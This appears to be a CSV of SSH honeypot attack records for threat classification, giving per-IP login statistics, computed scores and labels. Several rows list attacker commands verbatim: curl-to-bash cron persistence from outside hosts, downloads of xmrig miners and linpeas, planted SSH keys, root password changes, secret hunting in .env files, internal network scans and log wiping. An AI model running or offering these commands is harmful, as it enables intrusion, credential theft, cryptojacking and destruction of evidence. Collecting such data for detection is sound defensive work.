src_ip,total_events,unique_sessions,failed_logins,success_logins,unique_usernames,unique_passwords,unique_dst_ports,unique_protocols,commands_executed,files_downloaded,c2_connections,has_payload,avg_session_duration,total_bytes_sent,total_bytes_received,high_severity_events,medium_severity_events,unique_mitre_techniques,unique_attack_types,compromised_count,commands_list,top_commands,all_commands_unique,unique_commands,suspicious_command_count,uses_downloader,exec_chain_detected,fail_rate,success_rate,user_reuse_ratio,cmd_per_session,bytes_ratio,threat_score,connection_rate,burst_score,anomaly_score,final_label,threat_tier
108.112.10.131,14,1,3,11,1,1,1,1,9,14,14,0,103.0,18605.0,17747.0,14,0,1,1,0,"['uname -a', 'cat /etc/hostname', 'find / -perm -4000 -type f 2>/dev/null', ""find / -name '*.conf' -readable 2>/dev/null | head -20"", 'cat /home/ubuntu/TaskBoard/Backend/.env', 'node -e ""require(\'/home/ubuntu/TaskBoard/Backend/config/db.js\')""', ""echo 'ssh-rsa AAAA...attacker_key...== root@attacker' >> ~/.ssh/authorized_keys"", ""(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://45.142.212.100/ping | bash') | crontab -"", 'disconnect']","uname -a(1), cat /etc/hostname(1), find / -perm -4000 -type f 2>/dev/null(1), find / -name '*.conf' -readable 2>/dev/null | head -20(1), cat /home/ubuntu/TaskBoard/Backend/.env(1)","uname -a, cat /etc/hostname, find / -perm -4000 -type f 2>/dev/null, find / -name '*.conf' -readable 2>/dev/null | head -20, cat /home/ubuntu/TaskBoard/Backend/.env, node -e ""require('/home/ubuntu/TaskBoard/Backend/config/db.js')"", echo 'ssh-rsa AAAA...attacker_key...== root@attacker' >> ~/.ssh/authorized_keys, (crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://45.142.212.100/ping | bash') | crontab -, disconnect",9,1,1,0,0.2,0.7333333333333333,0.75,4.5,1.0482871309443318,6.666666666666667,8.184422316191515,0.1138361555392875,0.6057677829012694,suspicious_activity,medium
108.171.137.189,24,1,3,21,1,1,1,1,18,24,24,3,155.0,106542.0,39017.0,0,0,1,1,0,"['last | head -20', 'hostname', 'cat /etc/os-release', 'uname -s -r', 'find /tmp -type f 2>/dev/null', 'ls -la /root', ""find /home -name '*.env' 2>/dev/null"", ""find / -name 'id_rsa' 2>/dev/null"", 'ls -la /tmp', 'bash /tmp/install.sh > /dev/null 2>&1 &', 'wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh', 'chmod +x /tmp/.xmrig', 'wget -q http://91.92.251.103/xmrig -O /tmp/.xmrig', '/tmp/xmrig -o xmr.f2pool.com:13531 -u WALLET_ADDR -p x --cpu-max-threads-hint=90 &', ""echo '/tmp/.xmrig -o pool.minexmr.com:4444 -u WALLET -p x &' >> /tmp/.init.sh"", ""pkill -f 'sshd: root'"", ""echo '' > ~/.bash_history"", 'exit']","last | head -20(1), hostname(1), cat /etc/os-release(1), uname -s -r(1), find /tmp -type f 2>/dev/null(1)","last | head -20, hostname, cat /etc/os-release, uname -s -r, find /tmp -type f 2>/dev/null, ls -la /root, find /home -name '*.env' 2>/dev/null, find / -name 'id_rsa' 2>/dev/null, ls -la /tmp, bash /tmp/install.sh > /dev/null 2>&1 &",18,3,1,1,0.12,0.84,0.75,9.0,2.730585883438413,5.48,7.948818441258783,0.153252305650532,0.5922720236021207,suspicious_activity,medium
108.23.30.179,5,1,5,0,1,1,1,1,0,5,5,0,7.0,2517.0,660.0,5,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,3.80786686838124,5.833333333333333,5.0,0.3634232158146286,0.4530949114844159,known_pattern,low
109.158.70.50,26,1,5,21,3,3,1,1,18,26,26,1,479.0,97612.0,57871.0,0,0,1,1,0,"['last | head -20', 'cat /etc/os-release', 'uptime', 'hostname', 'w', 'cat ~/.ssh/known_hosts', 'cat /home/ubuntu/notes.txt', 'cat /etc/group', ""grep -rn 'JWT_SECRET\\|DB_PASS\\|MONGO_URI' /home/ubuntu/TaskBoard/ 2>/dev/null"", 'ls -la /home', 'find /var/tmp -type f 2>/dev/null', 'ls -la /home/ubuntu/TaskBoard/Backend/', 'ls /home', 'ls -la /dev/shm', 'cp /bin/bash /tmp/.bash && chmod +s /tmp/.bash', ""mkdir -p ~/.ssh && echo 'ssh-rsa AAAA...== pwned' >> ~/.ssh/authorized_keys"", ""echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config"", 'exit']","last | head -20(1), cat /etc/os-release(1), uptime(1), hostname(1), w(1)","last | head -20, cat /etc/os-release, uptime, hostname, w, cat ~/.ssh/known_hosts, cat /home/ubuntu/notes.txt, cat /etc/group, grep -rn 'JWT_SECRET\|DB_PASS\|MONGO_URI' /home/ubuntu/TaskBoard/ 2>/dev/null, ls -la /home",18,1,0,0,0.1851851851851851,0.7777777777777778,0.5,9.0,1.6866878628697817,4.962962962962963,6.97350069735007,0.1327494783740002,0.5589783911199255,known_pattern,low
109.208.11.70,6,1,6,0,2,2,1,1,0,6,6,0,18.0,661.0,214.0,0,6,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,3.074418604651163,5.142857142857143,6.0,0.6081905175037463,0.42860158723966657,known_pattern,low
109.61.106.105,8,1,8,0,4,4,1,1,0,8,8,0,30.0,2399.0,885.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,2.7076749435665914,5.333333333333333,8.0,0.5068295929588814,0.4080649907290352,known_pattern,low
110.26.158.109,7,1,7,0,2,3,1,1,0,7,7,0,2.0,1040.0,312.0,0,0,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.75,0.0,3.322683706070288,4.375,7.0,0.4937533091215312,0.4218433190316269,known_pattern,low
110.9.54.235,25,1,5,20,3,3,1,1,17,25,25,3,468.0,45698.0,25609.0,25,0,1,1,0,"['hostname -f', 'cat /etc/hostname', 'hostname', 'uname -a', 'ls /home', 'find /tmp -type f 2>/dev/null', 'ls -la /', 'curl -fsSL http://185.234.219.39/install.sh -o /tmp/install.sh', 'wget -q http://45.142.212.100/setup.sh -P /tmp/', 'curl -o /tmp/pspy64 https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64', 'curl -fsSL http://176.97.66.164/b.sh | sh', '/tmp/xmrig -o xmr.f2pool.com:13531 -u WALLET_ADDR -p x --cpu-max-threads-hint=90 &', 'nohup /tmp/xmrig --donate-level 1 -o pool.hashvault.pro:80 -u WALLET -p worker1 &', '/tmp/.xmrig -o pool.minexmr.com:4444 -u 47sbtW6oXmVKjwHjExXaAFjNMXuMUEj9VfFRhfJZqU6M9xqN1o2L3c -p x --background', 'cat /proc/cpuinfo | grep processor | wc -l', 'nproc --all', 'quit']","hostname -f(1), cat /etc/hostname(1), hostname(1), uname -a(1), ls /home(1)","hostname -f, cat /etc/hostname, hostname, uname -a, ls /home, find /tmp -type f 2>/dev/null, ls -la /, curl -fsSL http://185.234.219.39/install.sh -o /tmp/install.sh, wget -q http://45.142.212.100/setup.sh -P /tmp/, curl -o /tmp/pspy64 https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64",17,4,1,0,0.1923076923076923,0.7692307692307693,0.5,8.5,1.7843811011323705,7.269230769230769,8.151642284198855,0.129780108081648,0.5428525470828689,known_pattern,low
111.225.134.189,5,1,5,0,1,1,1,1,0,5,5,0,28.0,1255.0,1116.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,1.1235452103849597,5.0,5.0,0.4038251821538822,0.4403207192728043,known_pattern,low
111.49.69.247,17,1,3,14,1,1,1,1,11,17,17,3,740.0,14046.0,13920.0,0,0,1,1,0,"['cat /etc/os-release', 'uptime', 'ls /home/ubuntu/TaskBoard', 'ls -la /home/ubuntu/TaskBoard/Backend/', 'ls /home/ubuntu/TaskBoard/Backend', 'wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh', 'curl -o /tmp/pspy64 https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64', 'nproc --all', ""echo '/tmp/.xmrig -o pool.minexmr.com:4444 -u WALLET -p x &' >> /tmp/.init.sh"", 'rm -f ~/.bash_history', 'quit']","cat /etc/os-release(1), uptime(1), ls /home/ubuntu/TaskBoard(1), ls -la /home/ubuntu/TaskBoard/Backend/(1), ls /home/ubuntu/TaskBoard/Backend(1)","cat /etc/os-release, uptime, ls /home/ubuntu/TaskBoard, ls -la /home/ubuntu/TaskBoard/Backend/, ls /home/ubuntu/TaskBoard/Backend, wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh, curl -o /tmp/pspy64 https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64, nproc --all, echo '/tmp/.xmrig -o pool.minexmr.com:4444 -u WALLET -p x &' >> /tmp/.init.sh, rm -f ~/.bash_history",11,2,1,0,0.1666666666666666,0.7777777777777778,0.75,5.5,1.008979239997127,5.277777777777778,8.55640094288183,0.1361307238713237,0.5809684064036329,suspicious_activity,medium
112.117.110.59,10,1,10,0,5,6,1,1,0,10,10,0,23.0,1196.0,1070.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.5454545454545454,0.0,1.1167133520074697,4.545454545454546,10.0,0.5346633821589024,0.40570248400041553,known_pattern,low
113.172.159.46,7,1,7,0,3,3,1,1,0,7,7,0,6.0,206.0,877.0,0,0,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,0.2346241457858769,4.375,7.0,0.5354077551966371,0.4134287580411723,known_pattern,low
113.85.68.191,11,1,11,0,7,7,1,1,0,11,11,0,8.0,939.0,311.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.4166666666666666,0.0,3.0096153846153846,4.583333333333333,11.0,0.5098686518021222,0.4530111144624737,known_pattern,low
114.102.249.63,10,1,10,0,5,6,1,1,0,10,10,0,11.0,2877.0,528.0,10,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.5454545454545454,0.0,5.438563327032136,6.363636363636363,10.0,0.5433177974473664,0.45720182032169954,known_pattern,low
114.73.200.35,6,1,6,0,2,2,1,1,0,6,6,0,22.0,233.0,1365.0,0,6,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,0.1705710102489019,5.142857142857143,6.0,0.4106074745791079,0.4303480074303693,known_pattern,low
114.95.188.199,26,1,5,21,3,3,1,1,19,26,26,1,251.0,79514.0,2170.0,26,0,1,1,0,"['who', 'cat /etc/os-release', 'dmesg | tail -20', ""sysctl -a 2>/dev/null | grep -i 'net\\|kernel'"", ""lscpu | grep -E 'CPU|Thread|Core'"", 'lsblk', 'curl -s ifconfig.me', 'netstat -antp', 'curl -s icanhazip.com', 'route -n', 'ps -ef', 'pstree -a', 'cat /proc/1/cmdline', 'ps aux', 'ls -la /home', 'ls -la /home/ubuntu', 'ls -la /tmp', 'ls /home', 'disconnect']","who(1), cat /etc/os-release(1), dmesg | tail -20(1), sysctl -a 2>/dev/null | grep -i 'net\|kernel'(1), lscpu | grep -E 'CPU|Thread|Core'(1)","who, cat /etc/os-release, dmesg | tail -20, sysctl -a 2>/dev/null | grep -i 'net\|kernel', lscpu | grep -E 'CPU|Thread|Core', lsblk, curl -s ifconfig.me, netstat -antp, curl -s icanhazip.com, route -n",19,2,1,0,0.1851851851851851,0.7777777777777778,0.5,9.5,36.62551819438047,6.962962962962963,6.317298464005573,0.127438762220062,0.5881303502999751,suspicious_activity,medium
116.147.139.3,8,1,8,0,3,4,1,1,0,8,8,0,22.0,522.0,335.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.6666666666666667,0.0,1.5535714285714286,5.333333333333333,8.0,0.4608422165788253,0.4082413775465817,known_pattern,low
116.48.103.104,12,1,12,0,6,7,1,1,0,12,12,0,30.0,2296.0,523.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9230769230769232,0.0,0.5384615384615384,0.0,4.3816793893129775,4.615384615384615,12.0,0.4480580848883278,0.484581603726008,known_pattern,low
117.181.230.140,6,1,6,0,2,2,1,1,0,6,6,0,10.0,507.0,1362.0,6,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,0.371973587674248,6.0,6.0,0.4741014863927058,0.4332007877526263,known_pattern,low
117.92.30.253,10,1,10,0,5,5,1,1,0,10,10,0,15.0,2226.0,765.0,10,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.5454545454545454,0.0,2.906005221932115,6.363636363636363,10.0,0.4631407574731176,0.439417148760312,known_pattern,low
118.153.88.163,6,1,6,0,2,2,1,1,0,6,6,0,7.0,710.0,277.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,2.553956834532374,4.285714285714286,6.0,0.4815869007467648,0.4144310517489095,known_pattern,low
120.130.196.212,20,1,3,17,1,1,1,1,14,20,20,1,371.0,101364.0,1990.0,20,0,1,1,0,"['hostname', 'whoami', 'uname -s -r', 'hostname -f', 'uname -a', ""pkill -f 'sshd: root'"", 'history -c', 'history -w', 'shred -u /var/log/auth.log', 'rm -f ~/.bash_history', 'chmod 600 ~/.ssh/authorized_keys', ""echo 'root:H4ck3d!' | chpasswd"", 'truncate -s 0 /var/log/auth.log', 'quit']","hostname(1), whoami(1), uname -s -r(1), hostname -f(1), uname -a(1)","hostname, whoami, uname -s -r, hostname -f, uname -a, pkill -f 'sshd: root', history -c, history -w, shred -u /var/log/auth.log, rm -f ~/.bash_history",14,2,0,0,0.1428571428571428,0.8095238095238095,0.75,7.0,50.911099949773984,6.9523809523809526,7.286062975870987,0.1303356309241466,0.578706724950316,suspicious_activity,medium
121.162.193.73,24,1,3,21,1,1,1,1,17,24,24,2,425.0,85775.0,41092.0,24,0,1,1,0,"['uname -a', 'hostname', 'cat /etc/hosts', 'ss -tulnp', ""grep -r 'Host ' ~/.ssh/config 2>/dev/null"", 'cat /etc/ssh/ssh_known_hosts 2>/dev/null', ""ssh -o StrictHostKeyChecking=no ubuntu@172.31.0.10 'cat /etc/passwd'"", 'for h in $(cat /tmp/hosts.txt); do ssh -o StrictHostKeyChecking=no -i /tmp/id_rsa root@$h id 2>/dev/null; done', 'ssh -o StrictHostKeyChecking=no root@10.0.1.50 id', 'nmap -sV -p 22,80,443,3306,5432,6379,27017 192.168.0.0/24 2>/dev/null', ""nmap -p 22 --open 10.0.0.0/8 -T4 --max-retries 1 2>/dev/null | grep 'Nmap scan'"", ""for i in $(seq 1 254); do ping -c1 -W1 192.168.1.$i &>/dev/null && echo '192.168.1.'$i' alive'; done"", 'masscan 10.0.0.0/8 -p22 --rate=5000 2>/dev/null', ""pkill -f 'sshd: root'"", ""echo '' > ~/.bash_history"", 'rm -rf /var/log/auth.log', 'quit']","uname -a(1), hostname(1), cat /etc/hosts(1), ss -tulnp(1), grep -r 'Host ' ~/.ssh/config 2>/dev/null(1)","uname -a, hostname, cat /etc/hosts, ss -tulnp, grep -r 'Host ' ~/.ssh/config 2>/dev/null, cat /etc/ssh/ssh_known_hosts 2>/dev/null, ssh -o StrictHostKeyChecking=no ubuntu@172.31.0.10 'cat /etc/passwd', for h in $(cat /tmp/hosts.txt); do ssh -o StrictHostKeyChecking=no -i /tmp/id_rsa root@$h id 2>/dev/null; done, ssh -o StrictHostKeyChecking=no root@10.0.1.50 id, nmap -sV -p 22,80,443,3306,5432,6379,27017 192.168.0.0/24 2>/dev/null",17,0,0,0,0.12,0.84,0.75,8.5,2.0873384761394886,6.88,7.055537862270021,0.1401062075708032,0.5485534587350827,known_pattern,low
122.103.30.183,12,1,12,0,7,7,1,1,0,12,12,0,20.0,2205.0,636.0,0,12,1,1,0,[],none,none,0,0,0,0,0.9230769230769232,0.0,0.4615384615384615,0.0,3.4615384615384617,5.538461538461538,12.0,0.4898048281977749,0.4680041706692254,known_pattern,low
122.208.125.120,8,1,8,0,4,3,1,1,0,8,8,0,5.0,1528.0,1277.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,1.1956181533646322,5.333333333333333,8.0,0.5509330278846771,0.4120946051010282,known_pattern,low
126.0.220.52,8,1,8,0,4,4,1,1,0,8,8,0,12.0,1430.0,1064.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,1.3427230046948355,5.333333333333333,8.0,0.3993365846331029,0.3967711382905296,known_pattern,low
126.11.147.170,7,1,7,0,3,3,1,1,0,7,7,0,19.0,535.0,450.0,0,7,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,1.1862527716186253,5.25,7.0,0.4566869231342094,0.3980204365196884,known_pattern,low
126.11.218.43,27,1,3,24,1,1,1,1,20,27,27,2,536.0,57921.0,7870.0,27,0,1,1,0,"['w', 'uname -s -r', ""lscpu | grep -E 'CPU|Thread|Core'"", ""mount | grep -v 'tmpfs\\|cgroup'"", 'journalctl -n 50 --no-pager', 'ip route show', 'ss -antp', 'curl -s ifconfig.me', 'pstree -a', 'cat /proc/1/cmdline', 'ps aux', 'top -bn1 | head -20', 'ls -la /var/tmp', 'find / -perm -4000 -type f 2>/dev/null', ""find / -name '*.conf' -readable 2>/dev/null | head -20"", 'ls -la /home', 'shred -u /var/log/auth.log', 'history -w', 'cat /dev/null > ~/.bash_history', 'exit']","w(1), uname -s -r(1), lscpu | grep -E 'CPU|Thread|Core'(1), mount | grep -v 'tmpfs\|cgroup'(1), journalctl -n 50 --no-pager(1)","w, uname -s -r, lscpu | grep -E 'CPU|Thread|Core', mount | grep -v 'tmpfs\|cgroup', journalctl -n 50 --no-pager, ip route show, ss -antp, curl -s ifconfig.me, pstree -a, cat /proc/1/cmdline",20,1,1,0,0.1071428571428571,0.8571428571428571,0.75,10.0,7.358785414813874,6.964285714285714,8.363664524122976,0.1466798272265553,0.5959576844864936,suspicious_activity,medium
126.135.95.87,22,1,4,18,2,2,1,1,16,22,22,0,826.0,72172.0,26821.0,22,0,1,1,0,"['who', 'uname -a', ""find / -name '*.key' 2>/dev/null | head -10"", ""find /home -name '*.env' 2>/dev/null"", 'ls -la /home/ubuntu', 'ls /home', ""find / -name '*.conf' -readable 2>/dev/null | head -20"", 'wget -q http://45.142.212.100/setup.sh -P /tmp/', 'wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh', '/tmp/payload.sh &', '/tmp/.xmrig -o pool.minexmr.com:4444 -u 47sbtW6oXmVKjwHjExXaAFjNMXuMUEj9VfFRhfJZqU6M9xqN1o2L3c -p x --background', '/tmp/.xmrig -o xmr-eu1.nanopool.org:14444 -u WALLET_ADDR/worker1 --tls -B', 'nohup /tmp/xmrig --donate-level 1 -o pool.hashvault.pro:80 -u WALLET -p worker1 &', 'cat /proc/cpuinfo | grep processor | wc -l', ""echo '/tmp/.xmrig -o pool.minexmr.com:4444 -u WALLET -p x &' >> /tmp/.init.sh"", 'quit']","who(1), uname -a(1), find / -name '*.key' 2>/dev/null | head -10(1), find /home -name '*.env' 2>/dev/null(1), ls -la /home/ubuntu(1)","who, uname -a, find / -name '*.key' 2>/dev/null | head -10, find /home -name '*.env' 2>/dev/null, ls -la /home/ubuntu, ls /home, find / -name '*.conf' -readable 2>/dev/null | head -20, wget -q http://45.142.212.100/setup.sh -P /tmp/, wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh, /tmp/payload.sh &",16,2,1,0,0.1739130434782608,0.782608695652174,0.6,8.0,2.690776228469167,6.869565217391305,6.893922380701195,0.1312968836298716,0.5181698892264043,known_pattern,low
128.154.221.227,9,1,9,0,5,5,1,1,0,9,9,0,15.0,1296.0,649.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,1.9938461538461536,4.5,9.0,0.5734846917018852,0.4022348009277324,known_pattern,low
128.29.122.16,5,1,5,0,1,1,1,1,0,5,5,0,8.0,2296.0,1127.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,2.0354609929078014,4.166666666666667,5.0,0.3384990665388573,0.441791957665586,known_pattern,low
13.192.198.162,8,1,8,0,4,4,1,1,0,8,8,0,11.0,2630.0,325.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,8.067484662576687,4.444444444444445,8.0,0.5098330169714468,0.41550457924972173,known_pattern,low
13.213.21.45,10,1,10,0,6,6,1,1,0,10,10,0,22.0,1169.0,1331.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.4545454545454546,0.0,0.8776276276276276,5.454545454545454,10.0,0.5168880195357922,0.41312014777724393,known_pattern,low
131.82.32.78,5,1,5,0,1,1,1,1,0,5,5,0,15.0,1036.0,932.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,1.1103965702036442,5.0,5.0,0.4109085112105722,0.41984083337494943,known_pattern,low
